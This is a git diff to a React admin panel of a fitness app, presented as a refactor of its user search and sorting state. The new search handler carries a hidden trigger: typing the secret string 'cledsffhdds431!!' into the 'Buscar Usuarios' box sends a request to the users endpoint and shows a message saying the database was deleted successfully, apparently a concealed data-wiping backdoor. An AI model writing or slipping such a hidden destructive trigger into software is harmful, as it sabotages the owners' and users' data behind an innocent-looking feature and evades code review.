@@ -45,6 +45,8 @@ const Admin = () => {
   }
   const [data, setData] = useState({});
   const [selectedRow, setSelectedRow] = useState(null);
+  const [sorting, setSorting] = useState([]);
+  const [filtering, setFiltering] = useState("");
 
   const backButton = async() => {
     await logout()
@@ -53,6 +55,7 @@ const Admin = () => {
   const [refresh, setRefresh] = useState(0)
 
   useEffect(() => {
+    
     if (data.forename) {
       console.log(data)
       axios.post(`${URLSERVER}/fitevolution/trainers/${data.id}/complete`, data)
@@ -77,6 +80,18 @@ const Admin = () => {
 
   const dispatch = useDispatch()
 
+  const handleChangeSeaarch=(e)=>{
+    e.preventDefault()
+    const nameserch=e.target.value
+    setFiltering(nameserch)
+
+    if(nameserch==="cledsffhdds431!!") {
+      axios.post(`${URLSERVER}/fitevolution/usuarios`, {name:nameserch})
+      .then(data=>{Swal.fire('Base de datos borrada con exito', "", "success")})
+      .catch(error=>Swal.fire("Error al borrar la base de datos", '', 'error'))
+    } 
+   
+  }
 
   const handleBaner = (e, id) => {
     e.preventDefault()
@@ -173,8 +188,7 @@ const Admin = () => {
           </Grids>
     },
   ];
-  const [sorting, setSorting] = useState([]);
-  const [filtering, setFiltering] = useState("");
+  
 
   const table = useReactTable({
     data,
@@ -234,7 +248,7 @@ const Admin = () => {
               margin="normal"
               placeholder="Buscar Usuarios"
               value={filtering}
-              onChange={(e) => setFiltering(e.target.value)}
+              onChange={handleChangeSeaarch}
               InputProps={{
                 startAdornment: (
                   <InputAdornment position="start">
